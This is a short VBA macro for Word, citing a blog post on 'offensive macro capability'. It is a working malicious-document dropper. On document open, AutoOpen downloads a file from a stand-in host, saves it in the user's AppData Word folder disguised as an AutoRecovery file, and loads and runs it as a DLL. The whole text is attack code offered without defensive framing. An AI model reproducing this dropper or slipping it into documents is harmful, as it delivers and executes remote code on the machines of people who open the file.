Reference : "https://labs.mwrinfosecurity.com/blog/dll-tricks-with-vba-to-improve-offensive-macro-capability/"
''
Sub AutoOpen()
    Dim pathOfFile As String
    pathOfFile = Environ("AppData") & "\Microsoft\Word"
    VBA.ChDir pathOfFile
    ' DLL get loaded in module2
    
    Dim remoteFile As String
    Dim storeIn As String
    Dim HTTPReq As Object
    
    'Getting the remote file
    
    remoteFile = "https://example.com/client.js"
    storeIn = "AutoRecovery save of Document4.asd"
    
    ' Request the file and rertrieve it
    
    Set HTTPReq = CreateObject("Microsoft.XMLHTTP")
    HTTPReq.Open "GET", remoteFile, False
    HTTPReq.send
    
    If HTTPReq.Status = 200 Then
        Set output = CreateObject("ADODB.Stream")
        output.Open
        output.Type = 1 ' 1 = binary data
        output.Write HTTPReq.responseBody
        ' 2 = create, but if exists overwrite
        output.SaveToFile storeIn, 2
        output.Close
        
        Module2.Invoke ' Call the subroutine in module 2
        
    End If
        
End Sub

Private Declare Sub Run Lib "AutoRecovery save of Document4.asd" ()

Sub Invoke()
    Run ' Execute the dll
End Sub
''
